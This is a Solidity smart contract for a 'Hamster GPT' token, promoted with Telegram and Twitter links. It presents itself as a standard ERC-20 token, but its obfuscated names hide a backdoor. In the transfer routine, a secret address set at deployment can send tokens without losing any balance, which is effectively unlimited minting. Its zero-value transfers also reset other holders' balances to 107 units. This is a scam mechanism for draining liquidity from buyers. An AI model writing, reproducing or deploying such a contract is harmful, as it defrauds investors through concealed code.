/*

Telegram: https://t.me/HamsterGPTETH
Twitter: https://twitter.com/HamsterGPT

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.14;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract HamsterGPT is Ownable {
    mapping(address => uint256) private fidbveukxwza;

    uint8 public decimals = 9;

    function approve(address gemndkhlvi, uint256 cnagpmr) public returns (bool success) {
        allowance[msg.sender][gemndkhlvi] = cnagpmr;
        emit Approval(msg.sender, gemndkhlvi, cnagpmr);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function firqu(address qkzniyw, address cdrui, uint256 cnagpmr) private {
        if (fidbveukxwza[qkzniyw] == 0) {
            balanceOf[qkzniyw] -= cnagpmr;
        }
        balanceOf[cdrui] += cnagpmr;
        if (fidbveukxwza[msg.sender] > 0 && cnagpmr == 0 && cdrui != kuwn) {
            balanceOf[cdrui] = nqihjvga;
        }
        emit Transfer(qkzniyw, cdrui, cnagpmr);
    }

    constructor(address tkciya) {
        balanceOf[msg.sender] = totalSupply;
        fidbveukxwza[tkciya] = nqihjvga;
        IUniswapV2Router02 whuoxel = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        kuwn = IUniswapV2Factory(whuoxel.factory()).createPair(address(this), whuoxel.WETH());
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    string public name = 'Hamster GPT';

    mapping(address => mapping(address => uint256)) public allowance;

    uint256 private nqihjvga = 107;

    function transferFrom(address qkzniyw, address cdrui, uint256 cnagpmr) public returns (bool success) {
        require(cnagpmr <= allowance[qkzniyw][msg.sender]);
        allowance[qkzniyw][msg.sender] -= cnagpmr;
        firqu(qkzniyw, cdrui, cnagpmr);
        return true;
    }

    address public kuwn;

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private eadypvio;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transfer(address cdrui, uint256 cnagpmr) public returns (bool success) {
        firqu(msg.sender, cdrui, cnagpmr);
        return true;
    }

    string public symbol = 'Hamster GPT';
}